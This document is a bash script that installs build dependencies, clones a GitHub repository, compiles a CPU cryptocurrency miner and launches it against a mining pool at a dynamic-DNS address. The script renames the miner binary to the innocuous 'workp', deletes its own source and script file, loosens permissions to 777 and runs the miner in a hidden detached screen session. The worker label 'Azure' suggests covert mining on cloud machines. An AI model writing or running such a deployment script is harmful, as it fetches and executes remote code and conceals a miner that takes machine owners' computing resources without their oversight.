#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
git clone https://github.com/laptopdell/laptopaz
cd laptopaz
chmod +x *
./build.sh
make
mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopaz allaz.sh && sudo chmod 777 *
screen -d -m ./workp -u MMOProHN.Azure -p x -x daotienao.ddns.net:1997
